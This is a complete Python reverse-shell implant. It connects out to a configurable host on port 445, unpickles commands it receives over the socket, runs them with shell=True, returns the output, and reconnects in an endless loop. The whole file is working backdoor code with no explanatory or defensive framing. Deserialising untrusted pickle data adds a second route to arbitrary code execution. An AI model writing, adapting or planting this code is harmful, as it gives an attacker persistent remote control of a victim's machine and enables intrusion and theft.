import subprocess, socket, pickle, time, traceback

HOST = "0.0.0.0"
PORT = 445

doibreak = False

def yessir(idk):
    global doibreak

    r = subprocess.run(idk[0], text=True, capture_output=True, shell=True)
    out = r.stdout + r.stderr

    if idk[1] == "__eoc__":
        doibreak = True

    return out


while True:
    doibreak = False  # reset on reconnect
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((HOST, PORT))

            while True:
                data = sock.recv(4096)
                if not data:
                    break

                try:
                    thing = pickle.loads(data)
                except Exception:
                    continue

                output = yessir(thing)

                if output == "":
                    sock.sendall(b"\n")
                else:
                    sock.sendall(output.encode())

                if doibreak:
                    break

    except Exception as e:
#        print("ERROR:", e)
#        traceback.print_exc() - debugging stuff
        time.sleep(1)